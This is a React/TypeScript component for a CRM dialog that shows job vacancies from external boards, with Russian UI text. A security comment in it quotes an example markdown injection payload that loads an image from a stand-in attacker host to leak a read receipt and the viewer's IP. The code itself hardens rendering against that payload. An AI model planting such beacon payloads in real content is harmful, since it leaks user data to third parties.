import { useState } from 'react'
import ReactMarkdown, { type Components } from 'react-markdown'
import {
  ChevronDown,
  ChevronUp,
  ExternalLink,
  Loader2,
  ThumbsDown,
  ThumbsUp,
  X,
} from 'lucide-react'
import type { JobExclusionDto, JobSuggestionDto } from '@crm/shared'
import {
  useCreateJobExclusion,
  useDeleteJobExclusion,
  useJobExclusions,
  useJobSuggestions,
  useUpdateJobSuggestionStatus,
} from '@/hooks/use-job-sourcing'
import { Button } from '@/components/ui/button'
import {
  CrmDialogBody,
  CrmDialogFooter,
  CrmDialogHeader,
  Dialog,
  CrmDialogContent,
  DialogDescription,
  DialogTitle,
} from '@/components/ui/crm-dialog'
import { Input } from '@/components/ui/input'
import { isSafeExternalUrl, openOriginalPosting } from './open-original'
import { SourceBudgetPanel } from './SourceBudgetPanel'

/**
 * RENDER-SIDE HARDENING — security-review round 2, HIGH-1.
 *
 * The previous claim of "two independent layers" was wrong. The ingest layer
 * (html-to-markdown.ts) MANUFACTURED the injection by interpolating the link
 * destination raw, and the "we don't enable rehype-raw" argument does not
 * apply at all to the payload that resulted:
 *
 *   [t](https://ok.example/x)![](https://evil.example/px.png?leak=1)
 *
 * — that is valid MARKDOWN, not raw HTML. The only thing that stood between it
 * and a beacon request to a foreign host was react-markdown's own default
 * `urlTransform`: a library internal we neither configured nor documented, and
 * therefore never actually chose.
 *
 * These three props are OUR second layer, independent of the API by
 * construction — they hold even if `descriptionMd` arrives fully attacker-
 * controlled (pinned by a test that feeds exactly that):
 *
 *   1. `urlTransform` — ours, https-only, same predicate as the one guarding
 *      `window.open`. Not the library default: react-markdown's default only
 *      blocks dangerous SCHEMES (`javascript:`, `data:`) and happily passes
 *      plain `http:` and any foreign host. This prop is the SOLE URL gate, and
 *      it covers every url-bearing node, including ones we have not overridden.
 *      Pinned by "pins urlTransform …" — a test that reddens when THIS prop is
 *      removed and stays green when the `a` component is.
 *   2. `img: () => null` — a third-party job ad NEVER renders a remote image in
 *      our authenticated origin. This kills the beacon class outright (read
 *      receipt + viewer IP), regardless of how the markdown was produced.
 *      `img-src` in our CSP is a blanket `https:` (noted in #470), so the
 *      browser would not have stopped it either.
 *   3. `a` — link hygiene: `rel="noopener noreferrer nofollow"` + new tab, and
 *      an EMPTY href (what layer 1 leaves behind when it rejects a URL)
 *      degrades to plain text instead of a dead anchor. Deliberately does NOT
 *      re-run the URL predicate — see the comment on the component itself.
 *      Pinned by "pins the `a` component …", which reddens on ITS removal and
 *      not on layer 1's.
 */
export const MARKDOWN_URL_TRANSFORM = (url: string): string => (isSafeExternalUrl(url) ? url : '')

const MARKDOWN_COMPONENTS: Components = {
  img: () => null,
  // Link HYGIENE only — the URL was already gated by MARKDOWN_URL_TRANSFORM,
  // which blanks anything that is not https. Re-running the same predicate here
  // would make the two props indistinguishable: removing either would leave the
  // other covering for it, and NEITHER could then be pinned by a test. (That is
  // exactly how `urlTransform` shipped unverified in round 2.) An empty href —
  // what the transform produces for a rejected URL — degrades to plain text.
  a: ({ href, children }) =>
    href ? (
      <a href={href} target="_blank" rel="noopener noreferrer nofollow">
        {children}
      </a>
    ) : (
      <>{children}</>
    ),
}

/**
 * Подбор вакансий — the working loop of task-job-sourcing-slice1.
 *
 * One suggestion at a time: title, company, date, description (markdown), then
 * «Открыть оригинал» / «Откликнулись» / «Не подходит». Answering either of the
 * last two advances to the next vacancy.
 *
 * SECURITY — two things this component is deliberately careful about:
 *
 *  1. `descriptionMd` comes from a third party — and on a PUBLIC board, from
 *     whoever posted the vacancy. Rendering is hardened by the three
 *     `ReactMarkdown` props above (`urlTransform` / `img` / `a`); NOT enabling
 *     `rehype-raw` is necessary but nowhere near sufficient, because a
 *     markdown-level payload is not raw HTML at all. See the
 *     MARKDOWN_COMPONENTS docblock for the incident that taught us the
 *     difference.
 *  2. «Открыть оригинал» calls `window.open` SYNCHRONOUSLY, first thing in the
 *     handler. See open-original.ts for the full reasoning; the short version
 *     is that an `await` in front of it makes the button silently do nothing on
 *     a phone.
 */

function formatDate(iso: string | null): string {
  if (!iso) return ''
  const date = new Date(iso)
  if (Number.isNaN(date.getTime())) return ''
  return date.toLocaleDateString('ru-RU', { day: '2-digit', month: 'long', year: 'numeric' })
}

function ExclusionsPanel({
  seniorId,
  canManageGlobal,
}: {
  seniorId: string | undefined
  canManageGlobal: boolean
}) {
  const { data, isLoading } = useJobExclusions(seniorId)
  const createExclusion = useCreateJobExclusion(seniorId)
  const deleteExclusion = useDeleteJobExclusion(seniorId)
  const [value, setValue] = useState('')

  const items: JobExclusionDto[] = data?.items ?? []
  const derived = items.filter((i) => i.origin === 'PROJECT')
  const manual = items.filter((i) => i.origin === 'MANUAL')

  const submit = () => {
    const trimmed = value.trim()
    if (trimmed.length < 2) return
    // Design review round 3: this used to bail out when `seniorId` was
    // undefined — which is EXACTLY the case on a senior's own screen, where the
    // dialog deliberately passes no id so the API resolves the queue to the
    // caller. The result was a button that silently did nothing for the role
    // that needs it most, with no request in the server log to explain it.
    //
    // `seniorId` is now simply forwarded (omitted when unknown) and the server
    // decides: for a SENIOR it resolves to themselves; for an ADMIN/HR with no
    // senior picked it answers with "Выберите синьора…", which the mutation's
    // onError surfaces verbatim. Either a working path or a stated refusal —
    // never silence.
    createExclusion.mutate(
      {
        scope: 'SENIOR',
        ...(seniorId ? { seniorId } : {}),
        kind: 'COMPANY',
        value: trimmed,
      },
      { onSuccess: () => setValue('') },
    )
  }

  return (
    <section className="mt-6 border-t border-border/50 pt-4" data-testid="job-exclusions-panel">
      <h3 className="text-sm font-medium text-foreground">Исключения</h3>
      <p className="mt-1 text-xs text-muted-foreground">
        Компании из ваших проектов исключаются автоматически — вакансии своего клиента вы не
        увидите.
      </p>

      {isLoading ? (
        <p className="mt-3 text-xs text-muted-foreground">Загрузка…</p>
      ) : (
        <div className="mt-3 flex flex-wrap gap-2">
          {derived.map((item) => (
            <span
              key={`derived-${item.normalizedValue}`}
              data-testid="job-exclusion-derived"
              title={item.sourceLabel ? `Из проекта «${item.sourceLabel}»` : undefined}
              className="inline-flex items-center gap-1 rounded-full border border-border bg-muted/40 px-3 py-1 text-xs text-muted-foreground"
            >
              {item.value}
              <span className="text-[10px] uppercase tracking-wide opacity-70">проект</span>
            </span>
          ))}
          {manual.map((item) => (
            <span
              key={item.id ?? item.normalizedValue}
              data-testid="job-exclusion-manual"
              className="inline-flex items-center gap-1 rounded-full border border-border px-3 py-1 text-xs"
            >
              {item.value}
              {item.scope === 'GLOBAL' && (
                <span className="text-[10px] uppercase tracking-wide opacity-70">общее</span>
              )}
              {item.id && (item.scope === 'SENIOR' || canManageGlobal) && (
                <button
                  type="button"
                  aria-label={`Удалить исключение ${item.value}`}
                  onClick={() => deleteExclusion.mutate(item.id as string)}
                  className="ml-0.5 inline-flex h-6 w-6 min-h-[24px] min-w-[24px] items-center justify-center rounded-full hover:bg-muted"
                >
                  <X className="h-3 w-3" aria-hidden />
                </button>
              )}
            </span>
          ))}
          {items.length === 0 && (
            <p className="text-xs text-muted-foreground">Пока ничего не исключено.</p>
          )}
        </div>
      )}

      <div className="mt-3 flex flex-col gap-2 sm:flex-row">
        <Input
          value={value}
          onChange={(e) => setValue(e.target.value)}
          onKeyDown={(e) => {
            if (e.key === 'Enter') {
              e.preventDefault()
              submit()
            }
          }}
          placeholder="Компания или стоп-слово"
          aria-label="Новое исключение"
          data-testid="job-exclusion-input"
        />
        <Button
          type="button"
          variant="outline"
          onClick={submit}
          disabled={value.trim().length < 2 || createExclusion.isPending}
          data-testid="job-exclusion-add"
          className="min-h-[44px] sm:min-h-9"
        >
          Добавить
        </Button>
      </div>
    </section>
  )
}

/**
 * Why this vacancy is at the top (or is not) — task-vacancy-matching §2/§3.
 *
 * A rank the user cannot interrogate is just an opinion. Showing the matched
 * keywords turns "почему это первым?" into a readable answer, and makes a
 * mis-normalised keyword visible instead of silently skewing the order.
 */
function MatchSummary({ suggestion }: { suggestion: JobSuggestionDto }) {
  if (suggestion.matchScore === null) return null

  const percent = Math.round(suggestion.matchScore * 100)
  return (
    <p className="mt-2 flex flex-wrap items-center gap-1.5 text-xs" data-testid="job-match-summary">
      <span className="text-muted-foreground">Совпадение со стеком: {percent}%</span>
      {suggestion.matchedKeywords.map((keyword) => (
        <span
          key={keyword}
          data-testid="job-match-keyword"
          className="inline-flex items-center rounded-full border border-border bg-muted/40 px-2 py-0.5 text-[11px]"
        >
          {keyword}
        </span>
      ))}
    </p>
  )
}

export function JobSuggestionDialog({
  open,
  onClose,
  seniorId,
  canManageGlobal = false,
  canViewBudgets = false,
}: {
  open: boolean
  onClose: () => void
  /** Whose queue to show. `undefined` = "mine" (a SENIOR viewing their own). */
  seniorId: string | undefined
  canManageGlobal?: boolean
  /**
   * ADMIN only — `GET /job-sourcing/sources` is ADMIN-gated server-side, so
   * asking for it as anyone else buys a guaranteed 403 and an error box.
   */
  canViewBudgets?: boolean
}) {
  const { data, isLoading, isError } = useJobSuggestions(seniorId, open)
  const updateStatus = useUpdateJobSuggestionStatus(seniorId)

  /**
   * Whether the collapsed low-match tail is expanded. Defaults to CLOSED (the
   * owner asked for a quieter feed) but the counter that opens it is always
   * rendered — "скрытая вакансия это нерассмотренная вакансия".
   */
  const [showLowMatch, setShowLowMatch] = useState(false)

  // Stryker disable next-line ArrayDeclaration: the fallback only runs when the query has no data, which is exactly the loading/error render — and every section that reads this list is itself gated on isLoading/isError, so the fallback CONTENTS can never reach the DOM
  const lowMatch = data?.lowMatch ?? []
  const lowMatchCount = data?.lowMatchCount ?? 0
  // Stryker disable next-line ArrayDeclaration: same — consumed only by the no-stack hint, which is gated on isLoading/isError, so a non-empty fallback is unreachable
  const stackKeywords = data?.stackKeywords ?? []

  // When the tail is expanded its entries join the queue, after the good ones —
  // so «Не подходит» / «Откликнулись» work on them identically. Reviewing a
  // demoted vacancy must not be a second-class path.
  // One statement rather than a multi-line ternary: a `Stryker disable
  // next-line` comment attaches to a STATEMENT, and inside a multi-line
  // expression each mutant is attributed to a different line than the comment
  // lands on — so the suppression silently guarded nothing.
  //
  // Stryker disable next-line OptionalChaining,ArrayDeclaration: the fallback is reached only when the query has no data — the loading/error render, where the dialog shows its own state instead of the queue
  const visibleItems = data?.items ?? []
  const queue: JobSuggestionDto[] = showLowMatch ? [...visibleItems, ...lowMatch] : visibleItems
  const current: JobSuggestionDto | undefined = queue[0]
  const total = data?.total ?? 0

  /**
   * SYNCHRONOUS by contract — `window.open` is the FIRST thing that happens.
   * Do not add `await` above this line, and do not make the button's onClick
   * async. See open-original.ts.
   */
  const handleOpenOriginal = () => {
    openOriginalPosting(current?.posting.url)
  }

  return (
    <Dialog
      open={open}
      onOpenChange={(v) => {
        if (!v) onClose()
      }}
    >
      <CrmDialogContent maxWidth="sm:max-w-2xl" data-testid="job-suggestion-dialog">
        <CrmDialogHeader>
          <DialogTitle className="pr-8 text-base sm:text-lg">Подбор вакансий</DialogTitle>
          <DialogDescription className="sr-only">
            Вакансии с внешних площадок, подобранные для синьора
          </DialogDescription>
          {total > 0 && (
            <p className="mt-1 text-xs text-muted-foreground" data-testid="job-queue-counter">
              Осталось: {total}
            </p>
          )}
        </CrmDialogHeader>

        <CrmDialogBody className="pb-2">
          {isLoading && (
            <div className="flex items-center gap-2 py-8 text-sm text-muted-foreground">
              <Loader2 className="h-4 w-4 animate-spin" aria-hidden />
              Загрузка вакансий…
            </div>
          )}

          {isError && !isLoading && (
            <p className="py-8 text-sm text-destructive" data-testid="job-suggestion-error">
              Не удалось загрузить вакансии. Попробуйте позже.
            </p>
          )}

          {!isLoading && !isError && !current && (
            <div className="py-8 text-center" data-testid="job-suggestion-empty">
              <p className="text-sm font-medium">
                {lowMatchCount > 0
                  ? 'Вакансий с высоким совпадением нет'
                  : 'Подходящих вакансий нет'}
              </p>
              <p className="mt-1 text-xs text-muted-foreground">
                {lowMatchCount > 0
                  ? 'Ниже — те, что совпали со стеком слабее. Их можно раскрыть.'
                  : 'Новые появятся после следующего сбора — или ослабьте исключения ниже.'}
              </p>
            </div>
          )}

          {!isLoading && !isError && current && (
            <article data-testid="job-suggestion-card">
              <h2 className="text-base font-semibold sm:text-lg" data-testid="job-suggestion-title">
                {current.posting.title}
              </h2>
              <p className="mt-1 text-sm text-muted-foreground">
                <span data-testid="job-suggestion-company">{current.posting.companyName}</span>
                {current.posting.location && <span> · {current.posting.location}</span>}
                {current.posting.publishedAt && (
                  <span> · {formatDate(current.posting.publishedAt)}</span>
                )}
              </p>

              <MatchSummary suggestion={current} />

              <div
                className="prose prose-sm dark:prose-invert mt-4 max-w-none break-words text-sm leading-relaxed [&_a]:underline [&_li]:my-0.5 [&_p]:my-2 [&_ul]:list-disc [&_ul]:pl-5"
                data-testid="job-suggestion-description"
              >
                {/*
                  NO rehype-raw (raw HTML stays TEXT) — plus the three props
                  above, which are what actually stop a MARKDOWN-level payload.
                  See the MARKDOWN_COMPONENTS docblock; pinned by
                  __tests__/JobSuggestionDialog.test.tsx.
                */}
                <ReactMarkdown
                  urlTransform={MARKDOWN_URL_TRANSFORM}
                  components={MARKDOWN_COMPONENTS}
                >
                  {current.posting.descriptionMd}
                </ReactMarkdown>
              </div>
            </article>
          )}

          {/*
            The collapsed tail (task-vacancy-matching AC3). Rendered whenever
            anything was demoted — including when the good queue is empty, which
            is precisely when a silent filter would be most misleading ("нет
            вакансий" while 12 sit hidden behind a threshold).
          */}
          {/*
            No isLoading/isError guard here: `lowMatchCount` falls back to 0
            whenever the query has no data, so the count alone already hides
            this section in both states. The extra conditions were redundant —
            the mutation gate is what made that visible.
          */}
          {lowMatchCount > 0 && (
            <section className="mt-4 border-t border-border/50 pt-3" data-testid="job-low-match">
              <button
                type="button"
                onClick={() => setShowLowMatch((v) => !v)}
                aria-expanded={showLowMatch}
                data-testid="job-low-match-toggle"
                className="inline-flex min-h-[44px] items-center gap-1.5 text-xs text-muted-foreground underline-offset-2 hover:underline sm:min-h-0"
              >
                {showLowMatch ? (
                  <ChevronUp className="h-3.5 w-3.5 shrink-0" aria-hidden />
                ) : (
                  <ChevronDown className="h-3.5 w-3.5 shrink-0" aria-hidden />
                )}
                <span data-testid="job-low-match-count">
                  Ещё {lowMatchCount} с низким совпадением
                </span>
              </button>
              {showLowMatch && (
                <p className="mt-1.5 text-xs text-muted-foreground">
                  Они добавлены в очередь после подходящих — ничего не потеряно.
                </p>
              )}
            </section>
          )}

          {/*
            No stack on file → nothing was ranked. Say so, and say what to do:
            silently falling back to "newest first" would look identical to a
            ranking that decided every vacancy is equally good.
          */}
          {!isLoading && !isError && stackKeywords.length === 0 && (
            <p className="mt-4 text-xs text-muted-foreground" data-testid="job-no-stack-hint">
              Стек не задан — вакансии показаны по свежести, без ранжирования. Заполните навыки в
              резюме синьора, чтобы подбор учитывал стек.
            </p>
          )}

          <ExclusionsPanel seniorId={seniorId} canManageGlobal={canManageGlobal} />
          <SourceBudgetPanel canView={canViewBudgets} />
        </CrmDialogBody>

        <CrmDialogFooter className="sm:justify-between">
          <Button
            type="button"
            variant="outline"
            onClick={handleOpenOriginal}
            disabled={!current}
            data-testid="job-open-original"
            /*
              `order-last` looks backwards but is right: CrmDialogFooter is
              `flex-col-reverse` on mobile, so the LAST child renders at the
              TOP. Opening the original is the first thing the user does, so on
              a phone it belongs above the two verdicts; on `sm:` the footer is
              a normal row again and the ordering resets.
            */
            className="order-last min-h-[44px] w-full sm:order-none sm:w-auto"
          >
            <ExternalLink className="mr-2 h-4 w-4 shrink-0" aria-hidden />
            Открыть оригинал
          </Button>

          <div className="flex flex-col gap-2 sm:flex-row">
            <Button
              type="button"
              variant="outline"
              onClick={() => current && updateStatus.mutate({ id: current.id, status: 'REJECTED' })}
              disabled={!current || updateStatus.isPending}
              data-testid="job-mark-rejected"
              className="min-h-[44px] w-full sm:w-auto"
            >
              <ThumbsDown className="mr-2 h-4 w-4 shrink-0" aria-hidden />
              Не подходит
            </Button>
            <Button
              type="button"
              onClick={() => current && updateStatus.mutate({ id: current.id, status: 'APPLIED' })}
              disabled={!current || updateStatus.isPending}
              data-testid="job-mark-applied"
              className="min-h-[44px] w-full sm:w-auto"
            >
              <ThumbsUp className="mr-2 h-4 w-4 shrink-0" aria-hidden />
              Откликнулись
            </Button>
          </div>
        </CrmDialogFooter>
      </CrmDialogContent>
    </Dialog>
  )
}
